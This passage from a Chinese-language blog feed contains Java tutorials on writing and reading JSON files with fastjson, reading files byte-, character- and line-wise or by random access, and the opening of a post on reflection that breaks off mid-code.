class="hljs-punctuation">:</span><span class="hljs-string">&quot;111&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;yy&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;222&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;zz&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;333&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>如果是List：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map.put(<span class="hljs-string">&quot;xx&quot;</span>, <span class="hljs-string">&quot;111&quot;</span>);<br>map.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-string">&quot;222&quot;</span>);<br>map.put(<span class="hljs-string">&quot;zz&quot;</span>, <span class="hljs-string">&quot;333&quot;</span>);<br><br><span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>list.add(map);<br><br><span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:/fastjsonList.json&quot;</span>;<br><br>writeJson(fileName, list);<br></code></pre></td></tr></table></figure><p>文件内容为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;xx&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;111&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;yy&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;222&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;zz&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;333&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>如果是一个自定义类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写入到文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>student.setAge(<span class="hljs-number">18</span>);<br>student.setName(<span class="hljs-string">&quot;XY&quot;</span>);<br><br><span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:/fastjsonStudent.json&quot;</span>;<br><br>writeJson(fileName, student);<br></code></pre></td></tr></table></figure><p>最后得到文件内容为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;age&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">18</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;XY&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="读取json文件"><a href="#读取json文件" class="headerlink" title="读取json文件"></a>读取<code>json</code>文件</h2><p>定义写入的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">readJson</span><span class="hljs-params">(String fileName)</span>&#123;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(fileName);<br>    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> FileUtils.readFileToString(file, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">// 可以指定解析格式</span><br>        <span class="hljs-comment">// Map map = JSONObject.parseObject(jsonString, Map.class);</span><br>        jsonObject = JSONObject.parseObject(jsonString);<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>    <span class="hljs-keyword">return</span> jsonObject;<br>&#125;<br></code></pre></td></tr></table></figure><p>读取<code>json</code>内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:/fastjson.json&quot;</span>;<br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> readJson(fileName);<br></code></pre></td></tr></table></figure><p>输出内容为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;xx&quot;</span>:<span class="hljs-string">&quot;111&quot;</span>,<span class="hljs-string">&quot;yy&quot;</span>:<span class="hljs-string">&quot;222&quot;</span>,<span class="hljs-string">&quot;zz&quot;</span>:<span class="hljs-string">&quot;333&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>读取<code>List</code>内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:/fastjsonList.json&quot;</span>;<br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> readJson(fileName);<br></code></pre></td></tr></table></figure><p>这样会出错，看来只是保存<code>List</code>格式是不太好的，</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Exception</span> <span class="hljs-keyword">in</span> thread &quot;main&quot; com.alibaba.fastjson2.JSONException: illegal <span class="hljs-keyword">input</span>， <span class="hljs-keyword">offset</span> <span class="hljs-number">1</span>, <span class="hljs-type">char</span> [<br></code></pre></td></tr></table></figure><p>读取自定义类<code>Student</code>内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:/fastjsonStudent.json&quot;</span>;<br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> readJson(fileName);<br></code></pre></td></tr></table></figure><p>输出内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;age&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">18</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;XY&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>json</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[java] java读取文件</title>
    <link href="/2022/10/07/%5Bjava%5D%20java%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/"/>
    <url>/2022/10/07/%5Bjava%5D%20java%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="java读取文件"><a href="#java读取文件" class="headerlink" title="java读取文件"></a>java读取文件</h1><p>java读取文件有四种方式：</p><ol><li>按字节读取文件内容；</li><li>按字符读取文件内容；</li><li>按行读取文件内容；</li><li>随机读取文件内容；</li></ol><h2 id="按字节读取文件内容"><a href="#按字节读取文件内容" class="headerlink" title="按字节读取文件内容"></a>按字节读取文件内容</h2><p>以字节为单位读取文件，常用于读二进制文件，如图片、声音、影像等文件。</p><p>单字节读取文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFileByBytes</span><span class="hljs-params">(String fileName)</span><br>&#123;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(fileName);<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        in = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">int</span> tmpByte;<br>        <span class="hljs-keyword">while</span> ((tmpByte = in.read()) != -<span class="hljs-number">1</span>)<br>        &#123;<br>            System.out.write(tmpByte);<br>        &#125;<br>        in.close();<br>    &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                in.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>多字节读取文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFileByMultiBytes</span><span class="hljs-params">(String fileName)</span>&#123;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(fileName);<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">byte</span>[] tmpByte = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">100</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">byteRead</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        in = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-keyword">while</span> ((byteRead = in.read(tmpByte)) != -<span class="hljs-number">1</span>)<br>        &#123;<br>            System.out.write(tmpByte, <span class="hljs-number">0</span>, byteRead);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                in.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="按字符读取文件内容"><a href="#按字符读取文件内容" class="headerlink" title="按字符读取文件内容"></a>按字符读取文件内容</h2><p>以字符为单位读取文件，常用于读文本，数字等类型的文件。</p><p>单字符读取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFileByChars</span><span class="hljs-params">(String fileName)</span>&#123;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(fileName);<br>    <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file));<br>        <span class="hljs-type">int</span> tmpChar;<br>        <span class="hljs-keyword">while</span> ((tmpChar = reader.read()) != -<span class="hljs-number">1</span>)&#123;<br>            System.out.print((<span class="hljs-type">char</span>) tmpChar);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (reader != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                reader.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>多字符读取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFileByMultiChars</span><span class="hljs-params">(String fileName)</span>&#123;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(fileName);<br>    <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">char</span>[] tmpChars = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">30</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">charRead</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file));<br>        <span class="hljs-keyword">while</span> ((charRead = reader.read(tmpChars)) != -<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">if</span> (charRead == tmpChars.length)&#123;<br>                System.out.print(tmpChars);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; charRead; i++) &#123;<br>                    System.out.print(tmpChars[i]);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (reader != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                reader.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="按行读取文件内容"><a href="#按行读取文件内容" class="headerlink" title="按行读取文件内容"></a>按行读取文件内容</h2><p>以行为单位读取文件，常用于读面向行的格式化文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFileByLine</span><span class="hljs-params">(String fileName)</span>&#123;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(fileName);<br>    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(file));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">tmpString</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> ((tmpString = reader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;line &quot;</span> + line + <span class="hljs-string">&quot; : &quot;</span> + tmpString);<br>            line++;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (reader != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                reader.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="随机读取文件内容"><a href="#随机读取文件内容" class="headerlink" title="随机读取文件内容"></a>随机读取文件内容</h2><p>随机读取文件内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFileByRandomAccess</span><span class="hljs-params">(String fileName)</span>&#123;<br>    <span class="hljs-type">RandomAccessFile</span> <span class="hljs-variable">randomAccessFile</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        randomAccessFile = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(fileName, <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">fileLength</span> <span class="hljs-operator">=</span> randomAccessFile.length();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">beginIndex</span> <span class="hljs-operator">=</span> (fileLength &gt; <span class="hljs-number">4</span>) ? <span class="hljs-number">4</span> : <span class="hljs-number">0</span>;<br>        randomAccessFile.seek(beginIndex);<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">byteRead</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((byteRead = randomAccessFile.read(bytes)) != -<span class="hljs-number">1</span>)&#123;<br>            System.out.write(bytes, <span class="hljs-number">0</span>, byteRead);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (randomAccessFile != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                randomAccessFile.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[java] java反射</title>
    <link href="/2022/10/05/%5Bjava%5D%20java%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/10/05/%5Bjava%5D%20java%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h1><p>Java反射就是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；并且能改变它的属性。</p><p>反射机制允许程序在运行时取得任何一个已知名称的class的内部信息，包括包括其modifiers(修饰符)，fields(属性)，methods(方法)等，并可于运行时改变fields内容或调用methods。那么便可以更灵活的编写代码，代码可以在运行时装配，无需在组件之间进行源代码链接，降低代码的耦合度；还有动态代理的实现等等；但是需要注意的是反射使用不当会造成很高的资源消耗！</p><hr><p>定义一个类<code>Person</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AA&quot;</span>;<br>    <span class="hljs-comment">// 公有属性</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;<br>    <span class="hljs-comment">// 构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>    <span class="hljs-comment">// 有参构造</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-comment">// 有参构造</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-comment">// 私有方法</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;private eat()&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 公有方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br>        